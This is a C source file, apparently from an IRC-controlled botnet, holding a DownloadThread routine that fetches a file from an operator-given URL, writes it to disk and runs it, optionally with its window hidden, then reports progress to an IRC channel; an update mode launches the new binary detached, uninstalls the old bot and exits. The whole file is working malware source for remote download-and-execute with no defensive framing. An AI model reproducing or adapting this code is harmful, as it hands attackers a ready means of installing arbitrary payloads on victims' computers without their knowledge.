#include "../h/includes.h"
#include "../h/functions.h"
#ifndef NO_DOWNLOAD
extern char str_thread_fail[];
extern char str_quit_upd[];
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;
	NTHREAD dl = *((NTHREAD *)param);
	NTHREAD *dls = (NTHREAD *)param;
	dls->gotinfo = TRUE;
	IRC* irc=(IRC*)dl.conn;
	char dlfrom[MAX_HOSTNAME];
	char dlto[MAX_PATH];
	strncpy(dlfrom,dl.data1,sizeof(dlfrom));
	strncpy(dlto,dl.data2,sizeof(dlto));

	HANDLE fh = fInternetOpenUrl(ih, dlfrom, NULL, 0, 0, 0);
	if (fh != NULL)
	{
		HANDLE f = CreateFile(dlto, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		if (f < (HANDLE)1)
		{
			if (!dl.silent)
				irc->pmsg(dl.target,"%s Couldn't open file for writing: %s.",(dl.bdata1?update_title:download_title),dlto);

			fInternetCloseHandle(fh);
			clearthread(dl.threadnum);
			ExitThread(0);
		}
		total = 0;
		start = GetTickCount();
		char *fileTotBuff=(char *)malloc(512000);
		do
		{
			ZeroMemory(buffer,sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			WriteFile(f, buffer, r, &d, NULL);
			
			if ((total) < 512000)
			{
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
		}
		while (r > 0);

		speed = total / (((GetTickCount() - start) / 1000) + 1);
		free(fileTotBuff);
		CloseHandle(f);
		fInternetCloseHandle(fh);

		if (!dl.silent)
			irc->pmsg(dl.target,"%s File download: %.1fKB to: %s @ %.1fKB/sec.",(dl.bdata1?update_title:download_title), total/1024.0, dlto, speed/1024.0);

		if (!dl.bdata1 && dl.bdata2)
		{
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			BOOL hide=dl.bdata3, wait=dl.verbose;
			char path[MAX_PATH];
			strncpy(path,dlto,sizeof(path));
			if (!fPathRemoveFileSpec(path))
			{
				if (!dl.silent)
					irc->pmsg(dl.target,"%s Couldn't parse path, error: <%d>", download_title, GetLastError());
				return 1;
			}
			ZeroMemory(&si,sizeof(si));
			ZeroMemory(&pi,sizeof(pi));
			si.cb=sizeof(si);
			si.dwFlags = STARTF_USESHOWWINDOW;
			si.wShowWindow = (hide?SW_HIDE:SW_SHOW);

			if (!CreateProcess(NULL,dlto,NULL,NULL,FALSE,0,NULL,path,&si,&pi))
			{
				if (!dl.silent)
					irc->pmsg(dl.target,"%s Failed to create process: \"%s\", error: <%d>", download_title, dlto, GetLastError());
				return 1;
			}
			else
			{
				DWORD start=GetTickCount();
				if (!dl.silent)
					irc->pmsg(dl.target,"%s Created process: \"%s\", PID: <%d>",download_title,dlto,pi.dwProcessId);
				
				if (dl.verbose)
				{	
					WaitForSingleObject(pi.hProcess,INFINITE);
					DWORD stop=GetTickCount();
					char ttime[120],stime[120];
					stime[0]='\0';
					DWORD total = ((stop - start)/1000);
					DWORD hours = (total%86400)/3600;
					DWORD minutes = ((total%86400)%3600)/60;
					DWORD seconds = ((total%86400)%3600)%60;
					if (hours>0)
					{
						sprintf(ttime," %d%s",hours,(hours==1?" hour":" hours"));
						strcat(stime,ttime);
					}
					sprintf(ttime," %.2d:%.2d",minutes,seconds);
					strcat(stime,ttime);

					irc->pmsg(dl.target,"%s Process Finished: \"%s\", Total Running Time: %s.",download_title,dlto,stime);
				}
				if (pi.hProcess) CloseHandle(pi.hProcess);
				if (pi.hThread) CloseHandle(pi.hThread);
			}
		}
		else if (dl.bdata1)
		{
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));
			ZeroMemory(&sinfo, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dlto, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS|DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE)
			{
				uninstall(TRUE,(dl.idata1==1?TRUE:FALSE));
				irc->quit(str_quit_upd);
				Sleep(FLOOD_DELAY);
				irc->disconnect();
				fWSACleanup();
				ExitProcess(EXIT_SUCCESS);
			}
			else
			{
				if (!dl.silent)
					irc->pmsg(dl.target,"%s Update failed: Error executing file: %s.",update_title,dlto);
			}
		}
	}
	else
	{
		if (!dl.silent)
			irc->pmsg(dl.target,"%s Bad URL or DNS Error, error: <%d>",(dl.bdata1?update_title:download_title),GetLastError());
	}
	clearthread(dl.threadnum);
	ExitThread(0);
		return 0;
}
#endif
